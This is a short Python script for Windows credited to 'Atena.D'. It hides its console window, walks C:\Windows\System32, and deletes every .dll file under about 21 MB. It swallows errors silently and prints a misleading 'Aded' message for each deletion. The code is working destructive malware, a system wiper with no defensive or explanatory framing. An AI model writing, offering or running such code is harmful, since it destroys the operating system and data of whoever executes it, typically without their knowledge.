import os, win32gui, win32con
# Hide CMD
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)
from colorama import Fore,init
clear = lambda: os.system('cls' or "clear")
clear()
init()

path = "C:\\Windows\\System32\\"
line = os.chdir(path)
list_file =[]

#20mg==21,182,681


EXTENSIONS = {".dll"} # put type of file here
try: 
    for dirname, dirpaths, filenames in os.walk(path):
        for filename in filenames:
            ext = os.path.splitext(filename)[-1]
            if ext in EXTENSIONS:
                x = os.path.join(dirname, filename)
                if os.path.getsize(x) < 21182681:
                    os.remove(x)
                    print("Aded")
except:
    pass
    

win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)

print("/\/\/\/\/\/\/\/\/\/\  Made By Atena.D  /\/\/\/\/\/\/\/\/\/\  ")
